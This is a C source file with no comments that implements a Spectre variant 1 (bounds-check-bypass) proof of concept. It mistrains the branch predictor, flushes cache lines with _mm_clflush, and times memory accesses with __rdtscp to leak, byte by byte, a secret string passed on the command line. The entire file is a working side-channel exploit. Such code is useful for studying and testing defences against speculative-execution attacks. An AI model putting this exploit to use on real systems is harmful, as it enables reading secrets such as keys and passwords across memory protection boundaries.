#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>

#ifdef _MSC_VER

#include <intrin.h>
#pragma optimize("gt",on)

#else

#include <x86intrin.h>

#endif


#define CACHE_TIME 80
#define NUMBER_TRIES 1800
#define CACHE_LINE 512
#define DELAY_LEN 100
#define NUMBER_ATTACKS 30
#define ATTACKS_INTERVAL 6

unsigned int indexArraySize = 16;
uint8_t indexArray[16], attackArray[256 * CACHE_LINE];
int score[256];

void f(size_t i) {
    uint8_t someValue = 0;
    if (i < indexArraySize) {
        someValue &= attackArray[indexArray[i] * CACHE_LINE];
    }
}


void makeDelay() {
    int x = 0;
    for (volatile int i = 0; i < DELAY_LEN; i++) {
        x += i;
        x = x * x;
        x <<= 2;
    }
}


void getDataFromAddress(size_t needAddress, int bestScore[2], int bestScoreChar[2]) {
    for (int i = 0; i < 256; i++) {
        score[i] = 0;
    }

    unsigned int value = 0;
    volatile uint8_t *data;
    register uint64_t start, time;
    int mxScore1 = -1, mxScore2 = -1;

    for (volatile int try = 0; try < NUMBER_TRIES; try++) {
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&attackArray[i * CACHE_LINE]);
        }

        int x = 0;
        size_t validIndex = try % indexArraySize;
        for (volatile int j = 0; j < NUMBER_ATTACKS; j++) {
            makeDelay();

            x += j;
            x = x * x;
            x <<= 2;

            size_t index = ((j % ATTACKS_INTERVAL) - 1) & ~0xFFFF;
            index = validIndex ^ ((index | (index >> 16)) & (needAddress ^ validIndex));

            _mm_clflush(&indexArraySize);
            f(index);
        }

        for (volatile int i = 0; i < 256; i++) {
            int mixedIndex = ((i * 167) + 13) & 255;
            data = &attackArray[mixedIndex * CACHE_LINE];

            start = __rdtscp(&value);
            value = *data;
            time = __rdtscp(&value) - start;

            if (mixedIndex != indexArray[validIndex] && time <= CACHE_TIME) {
                score[mixedIndex]++;
            }
        }

        mxScore1 = mxScore2 = -1;
        for (int i = 32; i < 127; i++) {
            if (mxScore1 == -1 || score[i] >= score[mxScore1]) {
                mxScore2 = mxScore1;
                mxScore1 = i;
            } else if (mxScore2 < 0 || score[i] >= score[mxScore2]) {
                mxScore2 = i;
            }
        }

        if (mxScore1 != -1 && mxScore2 != -1 && ((score[mxScore2] > 0 && score[mxScore1] >= 2.5 * score[mxScore2]) ||
                                                 (score[mxScore2] == 0 && score[mxScore1] >= 2))) {
            break;
        }
    }

    bestScoreChar[0] = mxScore1;
    bestScore[0] = score[mxScore1];
    bestScoreChar[1] = mxScore2;
    bestScore[1] = score[mxScore2];
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Error: Not enough arguments");
        return 0;
    }

    char *secret = argv[1];

    for (int i = 0; i < indexArraySize; i++) {
        indexArray[i] = i + 1;
    }

    for (int i = 0; i < sizeof(attackArray); i++) {
        attackArray[i] = 1;
    }

    FILE *outputFile = NULL;
    bool fileOutput = (argc > 2);
    if (fileOutput) {
        outputFile = fopen(argv[2], "w");
    }

    if (!fileOutput) {
        printf("Result: ");
    } else {
        fprintf(outputFile, "Result: ");
    }

    size_t addressDelta = (size_t) (secret - (char *) indexArray);
    int bestScore[2], bestScoreChar[2];
    for (int i = 0; i < strlen(secret); i++) {
        getDataFromAddress(addressDelta++, bestScore, bestScoreChar);

        char output = '?';
        if (bestScore[0] > 0) {
            output = (char) (bestScoreChar[0]);
        } else if (bestScore[1] > 0) {
            output = (char) (bestScoreChar[1]);
        }

        if (!fileOutput) {
            printf("%c", output);
        } else {
            fprintf(outputFile, "%c", output);
        }
    }
    return 0;
}